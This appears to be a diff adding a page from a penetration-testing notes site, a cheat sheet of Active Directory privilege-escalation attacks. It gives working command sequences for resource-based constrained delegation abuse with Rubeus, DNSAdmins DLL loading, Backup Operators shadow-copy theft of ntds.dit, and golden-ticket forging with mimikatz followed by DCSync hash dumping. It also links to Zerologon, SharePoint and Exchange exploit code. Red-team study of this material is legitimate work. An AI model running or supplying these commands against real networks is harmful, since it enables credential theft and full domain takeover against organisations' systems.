+Get-DomainComputer TargetMachine | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
+
+#After that we need to get the RC4 hash of the new machine account&#39;s password using Rubeus
+Rubeus.exe hash /password:&#39;p@ssword!&#39;
+
+#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
+Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
+
+#Finally we can access the C$ drive of the target machine
+dir \\TargetMachine.wtver.domain\C$
+</pre></div>
+</div>
+<p>Detailed Articles:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></p></li>
+<li><p><a class="reference external" href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/">RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</a></p></li>
+</ul>
+<p>:exclamation: In Constrain and Resource-Based Constrained Delegation if we don’t have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick “tgt::deleg” from kekeo or “tgtdeleg” from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Command on Rubeus</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">tgtdeleg</span> <span class="o">/</span><span class="n">nowrap</span>
+</pre></div>
+</div>
+<p>Detailed Article:
+<a class="reference external" href="https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/">Rubeus – Now With More Kekeo</a></p>
+</div>
+<div class="section" id="dnsadmins-abuse">
+<h2>DNSAdmins Abuse<a class="headerlink" href="#dnsadmins-abuse" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.</em></p>
+<ol>
+<li><p>Enumerate the members of the DNSAdmins group:</p>
+<ul class="simple">
+<li><p>PowerView: <code class="docutils literal notranslate"><span class="pre">Get-NetGroupMember</span> <span class="pre">-GroupName</span> <span class="pre">&quot;DNSAdmins&quot;</span></code></p></li>
+<li><p>AD Module: <code class="docutils literal notranslate"><span class="pre">Get-ADGroupMember</span> <span class="pre">-Identiny</span> <span class="pre">DNSAdmins</span></code></p></li>
+</ul>
+</li>
+<li><p>Once we found a member of this group we need to compromise it (There are many ways).</p></li>
+<li><p>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Using dnscmd:</span>
+<span class="n">dnscmd</span> <span class="o">&lt;</span><span class="n">NameOfDNSMAchine</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">config</span> <span class="o">/</span><span class="n">serverlevelplugindll</span> \\<span class="n">Path</span>\<span class="n">To</span>\<span class="n">Our</span>\<span class="n">Dll</span>\<span class="n">malicious</span><span class="o">.</span><span class="n">dll</span>
+
+<span class="c1">#Restart the DNS Service:</span>
+<span class="n">sc</span> \\<span class="n">DNSServer</span> <span class="n">stop</span> <span class="n">dns</span>
+<span class="n">sc</span> \\<span class="n">DNSServer</span> <span class="n">start</span> <span class="n">dns</span>
+</pre></div>
+</div>
+</li>
+</ol>
+</div>
+<div class="section" id="abusing-active-directory-integraded-dns">
+<h2>Abusing Active Directory-Integraded DNS<a class="headerlink" href="#abusing-active-directory-integraded-dns" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://blog.netspi.com/exploiting-adidns/">Exploiting Active Directory-Integrated DNS</a></p></li>
+<li><p><a class="reference external" href="https://blog.netspi.com/adidns-revisited/">ADIDNS Revisited</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></p></li>
+</ul>
+</div>
+<div class="section" id="abusing-backup-operators-group">
+<h2>Abusing Backup Operators Group<a class="headerlink" href="#abusing-backup-operators-group" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
+group, we can then abuse it’s SeBackupPrivilege to create a shadow copy of the current state of the DC,
+extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.</em></p>
+<ol class="simple">
+<li><p>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Create a .txt file that will contain the shadow copy process script</span>
+<span class="n">Script</span> <span class="o">-&gt;</span><span class="p">{</span>
+<span class="nb">set</span> <span class="n">context</span> <span class="n">persistent</span> <span class="n">nowriters</span>  
+<span class="nb">set</span> <span class="n">metadata</span> <span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">system32</span>\<span class="n">spool</span>\<span class="n">drivers</span>\<span class="n">color</span>\<span class="n">example</span><span class="o">.</span><span class="n">cab</span>  
+<span class="nb">set</span> <span class="n">verbose</span> <span class="n">on</span>  
+<span class="n">begin</span> <span class="n">backup</span>  
+<span class="n">add</span> <span class="n">volume</span> <span class="n">c</span><span class="p">:</span> <span class="n">alias</span> <span class="n">mydrive</span>  
+ 
+<span class="n">create</span>  
+  
+<span class="n">expose</span> <span class="o">%</span><span class="n">mydrive</span><span class="o">%</span> <span class="n">w</span><span class="p">:</span>  
+<span class="n">end</span> <span class="n">backup</span>  
+<span class="p">}</span>
+
+<span class="c1">#Execute diskshadow with our script as parameter</span>
+<span class="n">diskshadow</span> <span class="o">/</span><span class="n">s</span> <span class="n">script</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<ol class="simple">
+<li><p>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
+simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
+going to use <a class="reference external" href="https://github.com/giuliano108/SeBackupPrivilege">this</a> amazing repo:</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Importing both dlls from the repo using powershell</span>
+<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">.</span>\<span class="n">SeBackupPrivilegeCmdLets</span><span class="o">.</span><span class="n">dll</span>
+<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">.</span>\<span class="n">SeBackupPrivilegeUtils</span><span class="o">.</span><span class="n">dll</span>
+  
+<span class="c1">#Checking if the SeBackupPrivilege is enabled</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">SeBackupPrivilege</span>
+  
+<span class="c1">#If it isn&#39;t we enable it</span>
+<span class="n">Set</span><span class="o">-</span><span class="n">SeBackupPrivilege</span>
+  
+<span class="c1">#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice</span>
+<span class="n">Copy</span><span class="o">-</span><span class="n">FileSeBackupPrivilege</span> <span class="n">w</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">NTDS</span>\<span class="n">ntds</span><span class="o">.</span><span class="n">dit</span> <span class="n">c</span><span class="p">:</span>\<span class="o">&lt;</span><span class="n">PathToSave</span><span class="o">&gt;</span>\<span class="n">ntds</span><span class="o">.</span><span class="n">dit</span> <span class="o">-</span><span class="n">Overwrite</span>
+  
+<span class="c1">#Dump the SYSTEM hive</span>
+<span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span>\<span class="n">SYSTEM</span> <span class="n">c</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">system</span><span class="o">.</span><span class="n">hive</span> 
+</pre></div>
+</div>
+<ol class="simple">
+<li><p>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</p></li>
+<li><p>Use secretsdump.py from impacket and dump the hashes.</p></li>
+<li><p>Use psexec or another tool of your choice to PTH and get Domain Admin access.</p></li>
+</ol>
+</div>
+<div class="section" id="abusing-exchange">
+<h2>Abusing Exchange<a class="headerlink" href="#abusing-exchange" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">Abusing Exchange one Api call from DA</a></p></li>
+<li><p><a class="reference external" href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">CVE-2020-0688</a></p></li>
+<li><p><a class="reference external" href="https://github.com/dirkjanm/PrivExchange">PrivExchange</a> Exchange your privileges for Domain Admin privs by abusing Exchange</p></li>
+</ul>
+</div>
+<div class="section" id="weaponizing-printer-bug">
+<h2>Weaponizing Printer Bug<a class="headerlink" href="#weaponizing-printer-bug" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/">Printer Server Bug to Domain Administrator</a></p></li>
+<li><p><a class="reference external" href="https://github.com/NotMedic/NetNTLMtoSilverTicket">NetNTLMtoSilverTicket</a></p></li>
+</ul>
+</div>
+<div class="section" id="abusing-acls">
+<h2>Abusing ACLs<a class="headerlink" href="#abusing-acls" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory</a></p></li>
+<li><p><a class="reference external" href="https://github.com/fox-it/aclpwn.py">aclpwn.py</a></p></li>
+<li><p><a class="reference external" href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a></p></li>
+</ul>
+</div>
+<div class="section" id="abusing-ipv6-with-mitm6">
+<h2>Abusing IPv6 with mitm6<a class="headerlink" href="#abusing-ipv6-with-mitm6" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">Compromising IPv4 networks via IPv6</a></p></li>
+<li><p><a class="reference external" href="https://github.com/fox-it/mitm6">mitm6</a></p></li>
+</ul>
+</div>
+<div class="section" id="sid-history-abuse">
+<h2>SID History Abuse<a class="headerlink" href="#sid-history-abuse" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS?: If we manage to compromise a child domain of a forest and <a class="reference external" href="https://www.itprotoday.com/windows-8/sid-filtering">SID filtering</a> isn’t enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the <a class="reference external" href="https://www.itprotoday.com/windows-8/sid-history">SID History</a> field on a kerberos TGT ticket, that defines the “extra” security groups and privileges.</em></p>
+<p>Exploitation example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>#Get the SID of the Current Domain using PowerView
+Get-DomainSID -Domain current.root.domain.local
+
+#Get the SID of the Root Domain using PowerView
+Get-DomainSID -Domain root.domain.local
+
+#Create the Enteprise Admins SID
+Format: RootDomainSID-519
+
+#Forge &quot;Extra&quot; Golden Ticket using mimikatz
+kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi
+
+#Inject the ticket into memory
+kerberos::ptt \path\to\ticket\golden.kirbi
+
+#List the DC of the Root Domain
+dir \\dc.root.domain.local\C$
+
+#Or DCsync and dump the hashes using mimikatz
+lsadump::dcsync /domain:root.domain.local /all
+</pre></div>
+</div>
+<p>Detailed Articles:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://adsecurity.org/?p=1640">Kerberos Golden Tickets are Now More Golden</a></p></li>
+<li><p><a class="reference external" href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></p></li>
+</ul>
+</div>
+<div class="section" id="exploiting-sharepoint">
+<h2>Exploiting SharePoint<a class="headerlink" href="#exploiting-sharepoint" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://medium.com/&#64;gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d">CVE-2019-0604</a> RCE Exploitation <br /><a class="reference external" href="https://github.com/k8gege/CVE-2019-0604">PoC</a></p></li>
+<li><p><a class="reference external" href="https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization">CVE-2019-1257</a>  Code execution through BDC deserialization</p></li>
+<li><p><a class="reference external" href="https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters">CVE-2020-0932</a> RCE using typeconverters <br /><a class="reference external" href="https://github.com/thezdi/PoC/tree/master/CVE-2020-0932">PoC</a></p></li>
+</ul>
+</div>
+<div class="section" id="zerologon-exploit">
+<h2>Zerologon Exploit<a class="headerlink" href="#zerologon-exploit" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.secura.com/pathtoimg.php?id=2055">Zerologon: Unauthenticated domain controller compromise</a>: White paper of the vulnerability.</p></li>
+<li><p><a class="reference external" href="https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon">SharpZeroLogon</a>: C# implementation of the Zerologon exploit.</p></li>
+<li><p><a class="reference external" href="https://github.com/BC-SECURITY/Invoke-ZeroLogon">Invoke-ZeroLogon</a>: Powershell implementation of the Zerologon exploit.</p></li>
+<li><p><a class="reference external" href="https://github.com/bb00/zer0dump">Zer0Dump</a>: Python implementation of the Zerologon exploit using the impacket library.</p></li>
+</ul>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="Linux-Exploits.html" class="btn btn-neutral float-right" title="Linux Exploits" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="Windows-Exploit-Suggester.html" class="btn btn-neutral float-left" title="Windows Exploit Suggester" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        
+        &copy; Copyright 2020, Ryan Heavican
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
